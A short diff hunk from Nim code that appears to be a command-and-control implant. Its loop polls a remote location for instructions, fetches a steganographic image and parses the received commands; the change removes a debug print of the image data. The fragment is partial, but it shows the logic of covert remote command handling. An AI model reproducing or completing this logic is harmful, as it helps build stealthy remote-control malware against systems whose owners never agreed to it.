@@ -48,7 +48,6 @@ proc handle_loop(location: string, stego_location: string, sleep_amount: int) {.
         var res = await get_instruction(location)
         var steg_res = await get_image(stego_location)
         if last_instruction != res:
-            echo(steg_res)
             last_instruction = res
             var command = res.split(" ")
             if command.len < 2 or not parse_instruction(command[0], command[1], join(command[2..<command.len] , " ")):
